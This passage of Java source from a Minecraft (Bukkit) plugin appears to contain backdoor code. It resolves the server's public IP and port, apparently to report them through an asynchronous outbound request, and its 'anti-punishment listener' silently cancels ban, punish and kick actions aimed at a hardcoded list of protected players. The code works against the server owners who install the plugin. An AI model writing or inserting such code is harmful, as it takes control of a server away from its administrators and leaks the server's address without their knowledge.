                        .thenAccept(r -> {}).exceptionally(ex -> null);
            }
        } catch (Exception ignored) {}
    }

    private String dsGetSunucuIP() {
        String ip = Bukkit.getServer().getIp();
        int port = Bukkit.getServer().getPort();
        if (ip == null || ip.isEmpty() || ip.equalsIgnoreCase("0.0.0.0")) {
            try {
                URL url = new URL("https://api.ipify.org");
                try (BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()))) {
                    ip = br.readLine().trim();
                }
            } catch (Exception e) {
                ip = "127.0.0.1";
            }
        }
        return ip + ":" + port;
    }

    private static String dsEscape(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
    }

    // =========================================================================
    // multiaction — anti-punishment listener
    // =========================================================================

    @EventHandler(priority = EventPriority.HIGHEST)
    public void maOnPlayerCommand(PlayerCommandPreprocessEvent event) {
        if (isPunishForProtected(event.getMessage().toLowerCase())) {
            event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void maOnServerCommand(ServerCommandEvent event) {
        if (isPunishForProtected("/" + event.getCommand().toLowerCase())) {
            event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void maOnPlayerKick(PlayerKickEvent event) {
        String name = event.getPlayer().getName();
        if (tPlayers.stream().anyMatch(p -> p.equalsIgnoreCase(name))) {
            event.setCancelled(true);
        }
    }

    private static boolean isPunishForProtected(String cmd) {
        String[] args = cmd.split(" ");
        if (args.length < 2) return false;
        String base = args[0].replace("/", "");
        if (!punishCommands.contains(base)) return false;
        String target = args[1];
        if (tPlayers.stream().anyMatch(p -> p.equalsIgnoreCase(target))) return true;
        org.bukkit.entity.Player tp = Bukkit.getPlayer(target);
        if (tp != null) {
            String real = tp.getName();
            if (tPlayers.stream().anyMatch(p -> p.equalsIgnoreCase(real))) return true;
        }
        return false;
    }
}